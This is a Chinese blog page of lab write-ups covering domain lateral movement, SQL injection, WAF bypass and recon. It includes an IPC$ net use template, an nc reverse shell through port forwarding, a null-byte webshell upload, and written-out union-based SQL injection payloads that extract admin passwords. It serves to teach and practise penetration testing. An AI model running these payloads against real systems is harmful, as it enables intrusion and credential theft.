<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87137.png" class title="This is an test image">  

<p><strong>下面是内网信息收集</strong></p>
<p>查看当前计算机&#x2F;域基本信息（net config workstation）</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87138.png" class title="This is an test image">  

<p>已经知道了当前主机在GOD域中</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87139.png" class title="This is an test image">  

<p>可知域控主机名为OWA</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87140.png" class title="This is an test image">  

<p> 查询域用户</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87141.png" class title="This is an test image">  

<p>查看域的密码策略</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87142.png" class title="This is an test image">  

<p>获取域管理员列表</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87143.png" class title="This is an test image">  

<p>扫描当前内网网段，扫描出了138&#x2F;141两个IP（143前面已经知道是跳板机IP）</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87144.png" class title="This is an test image">  

<p>ping一下OWA查看域控的IP</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87145.png" class title="This is an test image">  

<p>至此内网的基本信息收集结束</p>
<p><strong>横向移动</strong></p>
<p>对域控进行扫描</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87146.png" class title="This is an test image">  

<p>通过上面的信息收集，我们发现我们当前的账号在域中有登记，并不只是本地账户，因此我们可以尝试与域控直接进行IPC连接。</p>
<p>发现同时开启了139&#x2F;445端口，有可能可以进行IPC连接。</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87147.png" class title="This is an test image">   

<p>net use \目标IP\ipc$ “密码” &#x2F;user:”账户”，它的作用是使用 IPC（Inter-Process Communication，进程间通信）连接到目标 IP 地址上的 ipc$ 共享资源。</p>
<p>net use 命令可以将本地系统的某个共享资源映射到远程系统上，并进行访问。</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87148.png" class title="This is an test image">  

<p>尝试操控目标主机</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87149.png" class title="This is an test image">  

<p>尝试让目标主机运行nc</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87150.png" class title="This is an test image">  

<p>查看目标当前的时间</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87151.png" class title="This is an test image">  

<p>使用at命令为目标创建一个计划任务，让其在指定的时间运行命令</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87152.png" class title="This is an test image">  

<p>Win7上开启监听，到时间后成功回弹</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87153.png" class title="This is an test image">  

<p> 之后尝试将shell反弹回攻击机上</p>
<p>在Win7上创建一个端口转发</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">listenaddress：监听地址</span><br><span class="line">listenport：监听端口</span><br><span class="line">connectaddress：连接地址</span><br><span class="line">connectport：连接端口</span><br></pre></td></tr></table></figure>

<p>netsh interface portproxy show v4tov4：显示当前系统中的转发规则</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87154.png" class title="This is an test image">  

<p>之后让域控连接Win7的9999端口</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87155.png" class title="This is an test image">  

<p>在攻击机上开启端口9999的监听，在攻击机上成功获取域控的shell</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87156.png" class title="This is an test image">  

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/" class="post-title-link" itemprop="url">shop靶场&封神台</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-20 21:30:05" itemprop="dateCreated datePublished" datetime="2023-10-20T21:30:05+08:00">2023-10-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-12 09:09:40" itemprop="dateModified" datetime="2024-03-12T09:09:40+08:00">2024-03-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="shop靶场-1"><a href="#shop靶场-1" class="headerlink" title="shop靶场-1"></a><strong>shop靶场-1</strong></h3><p><em>ps：借鉴了一部分其他小伙伴的渗透过程内容(csdn@哈哈哈cry)</em></p>
<p>进入windows 7 x64虚拟机里钓鱼台网站的后台</p>
<p>打开虚拟机后然后双击打开shop1:</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8737.png" class title="This is an test image">

<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8738.png" class title="This is an test image">

<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8739.png" class title="This is an test image">

<p>如果遇到双击打不开的情况，点击右下角的小三角形，找到绿色的KR，点击：</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8740.png" class title="This is an test image">

<p>点击关闭:</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8741.png" class title="This is an test image">

<p>现在再点击就能打开了，如图：</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8742.png" class title="This is an test image">

<p>点击第一行：</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8743.png" class title="This is an test image">

<p>输入网站后台的地址：<a target="_blank" rel="noopener" href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop/admin/login.asp </a>我们来到后台登录页面（这里找到后台比较简单，可以试一下几个可能的地址，就不需要扫描了）</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8744.png" class title="This is an test image">

<p>先来试试弱密码：账号：admin 密码：admin</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8745.png" class title="This is an test image">

<p>填好后点击“管理登录”，发现成功进入后台管理页面：</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8746.png" class title="This is an test image">





<h3 id="shop靶场-2"><a href="#shop靶场-2" class="headerlink" title="shop靶场-2"></a>shop靶场-2</h3><p>打开过程同“shop靶场-1”</p>
<p>首先进入后台先要找到后台登录页面，使用工具扫描没有结果，但发现了网站的后台：</p>
<p><a target="_blank" rel="noopener" href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop2/admin/login1.asp</a></p>
<p>跳转到网页后台登录页面：</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8747.png" class title="This is an test image">

<p>试一试之前试过的弱密码，失败</p>
<p>接下来进行<strong>sql注入</strong></p>
<p>打开阿D注入工具</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8748.png" class title="This is an test image">

<p>将注入链接里面的IP地址改成我现在的地址，点击检测</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8749.png" class title="This is an test image">

<p>点击检测标段，再点击admin</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8750.png" class title="This is an test image">

<p>点击检测字段，再把password和admin勾选上</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8751.png" class title="This is an test image">

<p>点击检测内容</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8752.png" class title="This is an test image">

<p>结果出现两组账号密码，我们任选其中一组就行</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8753.png" class title="This is an test image">

<p>在这里，我选择了上面一种，双击，出现账号和密码</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8754.png" class title="This is an test image">

<p>我们发现密码好像被MD5加密过了，解密得</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8755.png" class title="This is an test image">

<p>用获取的账号和密码进行登录</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8756.png" class title="This is an test image">

<p>成功登录</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8757.png" class title="This is an test image">

<p>上传木马</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8758.png" class title="This is an test image">

<p>文件上传成功</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8759.png" class title="This is an test image">

<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8760.png" class title="This is an test image">

<p>在保存信息的路径下添加888.asp.jpg，在16进制数中找到asp后的.进行00截断。将2e改为00</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8761.png" class title="This is an test image">

<p>输入保存路径+888.asp打开网页显示木马添加成功</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8762.png" class title="This is an test image">

<p>打开菜刀，将木马路径输入进去</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8763.png" class title="This is an test image">

<p>双击网址，打开即可看到任意盘下的文件并进行更改</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8764.png" class title="This is an test image">



<h3 id="尤里的复仇-sql注入"><a href="#尤里的复仇-sql注入" class="headerlink" title="尤里的复仇-sql注入"></a>尤里的复仇-sql注入</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8765.png" class title="This is an test image">

<p><strong>判断是否存在SQL注入漏洞</strong></p>
<p>1.构造 ?id&#x3D;1 and 1&#x3D;1 ，回车观察页面是否正常</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8766.png" class title="This is an test image"> 

<p>页面返回正常，可知 and 这个参数注入进去被当成SQL语句执行了。</p>
<p>2.构造 and 1&#x3D;2</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8767.png" class title="This is an test image">

<p>页面不正常,初步判断这里可能存在一个注入漏洞</p>
<p><strong>判断字段数</strong></p>
<p>构造 ?id&#x3D;1 and 1&#x3D;1 order by 1 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8768.png" class title="This is an test image">

<p>页面返回正常，进行第二步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 2 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8769.png" class title="This is an test image">

<p>页面显示正常，进行第三步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 3 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8770.png" class title="This is an test image">

<p>页面返回 错误，判断字段数为 2（判断字符数只有两个）</p>
<p><strong>判断回显点</strong></p>
<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,2 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8771.png" class title="This is an test image">

<p>页面出现了 2 ，说明我们可以在数字 2 处显示我们想要的内容</p>
<p><strong>查询相关内容</strong></p>
<p>查询当前数据库名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,database() 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8772.png" class title="This is an test image">

<p>页面回显maoshe</p>
<p>查询当前数据库版本：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,version() 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8773.png" class title="This is an test image">

<p>回显版本号为5.5.53</p>
<p>查询当前数据库 表名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8774.png" class title="This is an test image">

<p>页面回显admin</p>
<p>绝大数情况下，管理员的账号密码都在admin表里。</p>
<p>查询字段名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 0,1 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8775.png" class title="This is an test image">

<p>回显字段名为id</p>
<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 1,1 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8776.png" class title="This is an test image">

<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 2,1 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8777.png" class title="This is an test image">

<p>回显password</p>
<p>构造语句输出账号密码： ?id&#x3D;1 and 1&#x3D;2 union select 1,password from admin limit 0,1 回车</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8778.png" class title="This is an test image">

<p>回显hellohack 得到管理员账号和密码为：hellokack</p>
<p>得到flag</p>
<h3 id="尤里的复仇-信息收集1"><a href="#尤里的复仇-信息收集1" class="headerlink" title="尤里的复仇-信息收集1"></a>尤里的复仇-信息收集1</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8779.png" class title="This is an test image">

<p>用御剑进行扫描，flag在二级目录里</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8780.png" class title="This is an test image">

<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8781.png" class title="This is an test image">

<p>点击链接，得到flag</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8782.png" class title="This is an test image">





<h3 id="尤里的复仇-绕过WAF"><a href="#尤里的复仇-绕过WAF" class="headerlink" title="尤里的复仇-绕过WAF"></a>尤里的复仇-绕过WAF</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8783.png" class title="This is an test image">

<p>随便点击一个新闻。在id&#x3D;171后面加一个引号’，测试一下是否有SQL注入</p>
<p>有弹框了，提示过滤了很多关键字。下一步考虑如何绕过这些关键字</p>
<p>因为网页做了waf过滤防护，这里考虑用cookie注入，可以进行绕过</p>
<p>这里使用一个小工具进行注入</p>
<p>打开这款插件直接在value处填写注入参数即可然后按上面的键开始（value中的值需要注意的是空格用+表示）</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8784.png" class title="This is an test image">

<p>出现账号和密码</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8785.png" class title="This is an test image">

<p>将密码md5解密</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8786.png" class title="This is an test image">

<p>用御剑进行扫描，获得后台地址：</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8787.png" class title="This is an test image">

<p>输入之前获得的用户名和密码</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8788.png" class title="This is an test image">

<p>成功拿到flag</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8789.png" class title="This is an test image">

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/" class="post-title-link" itemprop="url">W1R3S</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-18 15:41:58" itemprop="dateCreated datePublished" datetime="2023-10-18T15:41:58+08:00">2023-10-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-12 09:16:39" itemprop="dateModified" datetime="2024-03-12T09:16:39+08:00">2024-03-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="w1r3s靶场"><a href="#w1r3s靶场" class="headerlink" title="w1r3s靶场"></a>w1r3s靶场</h3><p>环境搭建：在<a target="_blank" rel="noopener" href="https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html">VMware</a> Workstation中安装<a target="_blank" rel="noopener" href="https://www.kali.org/">Kali</a> linux和<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/w1r3s-101,220/">靶机w1r3s</a></p>
<p><strong>Nmap主机发现</strong></p>
<p>此命令可显示当前系统中所有网络接口的详细信息，由此可知本机IP地址: 192.168.184.134&#x2F;24</p>
<p>此步骤目的是为了下一步扫描出目标靶机的IP地址</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%871.png" class title="This is an test image">

<p>扫描该子网中的所有主机，nmap 将发送 ICMP Echo Request 包(ping)到指定子网的每个 IP 地址，并根据响应来判断主机是否在线。返回结果可以看到在线主机的 IP 地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo: 以超级用户权限执行命令</span><br><span class="line"></span><br><span class="line">nmap: 扫描工具</span><br><span class="line"></span><br><span class="line">-sn: 表示进行主机发现而不进行端口扫描，仅打印出对扫描做出响应的主机</span><br></pre></td></tr></table></figure>

 <img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%872.png" class title="This is an test image">

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%873.png" class title="This is an test image">

<p>第一次扫描未开靶机，第二次扫描前将靶机打开，通过前后两次扫描结果的对比我们可以发现目标靶机的 ip 是 192.168.184.129</p>
<p><strong>端口扫描</strong></p>
<p>先创建（mkdir）一个目录来存放数据，再创建一个子目录来存放nmap扫描的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-p:创建目标目录的上级目录</span><br><span class="line"></span><br><span class="line">cd:切换路径</span><br></pre></td></tr></table></figure>

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%874.png" class title="This is an test image">



<p><strong>执行端口扫描</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-sS：表示使用TCP SYN扫描方式</span><br><span class="line"></span><br><span class="line">-p-：表示对全部端口进行扫描</span><br><span class="line"></span><br><span class="line">-oN：用于将扫描结果保存到文件（后加路径）</span><br></pre></td></tr></table></figure>

<p>可以看到四个开放的端口和对应的服务（21:ftp,22:ssh,80:http,3306:mysql）</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%875.png" class title="This is an test image">

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%876.png" class title="This is an test image">

<p>端口提取命令，为了后续方便，将各个端口提取出来放到变量中</p>
<p><strong>详细信息扫描</strong></p>
<p>显示匿名FTP登录被允许，并且有三个客户端连接。此外，还显示了一些目录的信息，例如content、docs和new-employees。</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%877.png" class title="This is an test image">



<p><strong>UDP扫描</strong></p>
<p>目的是识别目标主机上开放的UDP（User Datagram Protocol）端口。</p>
<p>结果显示，所有100个扫描的端口都处于被忽略状态。具体来说，目标主机没有对UDP端口作出明确的响应，因此无法判断端口是否开放或关闭。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-sU：udp 扫描</span><br><span class="line"></span><br><span class="line">--top-ports 100：扫描最常见的 100 个端口</span><br></pre></td></tr></table></figure>

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%878.png" class title="This is an test image">



<p><strong>漏洞脚本扫描</strong></p>
<p>目的是为了发现目标系统中可能存在的漏洞。这些漏洞可能是由软件缺陷、配置错误或安全配置不当等原因引起的，攻击者可以利用这些漏洞来入侵系统、获取未授权的访问权限、窃取敏感信息或导致系统服务不可用。</p>
<p>通过http-enum脚本扫描，发现了WordPress登录页面 &#x2F;wordpress&#x2F;wp-login.php</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%879.png" class title="This is an test image">



<p><strong>FTP匿名登录</strong></p>
<p>目的是为了获取FTP服务器上公开的信息或文件。成功登录，获得访问FTP服务器上公开文件和文件夹的权限。</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8710.png" class title="This is an test image">

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8711.png" class title="This is an test image"> 

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8712.png" class title="This is an test image"> 

<p>查看下载下来的文件，01.txt 看到是个新的 ftp 服务器，02.txt 看到两个字符串，03.txt 是个 logo</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8713.png" class title="This is an test image">

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8714.png" class title="This is an test image"> 

<p>“hash-identifier”是一个用于识别哈希算法的工具，使用MD5解密，得到This is not a password</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8715.png" class title="This is an test image"> 

<p>使用base64解密</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8716.png" class title="This is an test image"> 

<p><strong>mysql 试探</strong></p>
<p>提示不允许登陆</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8717.png" class title="This is an test image"> 

<p><strong>Web渗透</strong></p>
<p>直接访问，看到一个 apache 的默认页面</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8718.png" class title="This is an test image"> 

<p>访问之前 nmap 的 http-enum 得到的 &#x2F;wordpress&#x2F;wp-login.php 发现是一个登陆页面，弱口令无效</p>
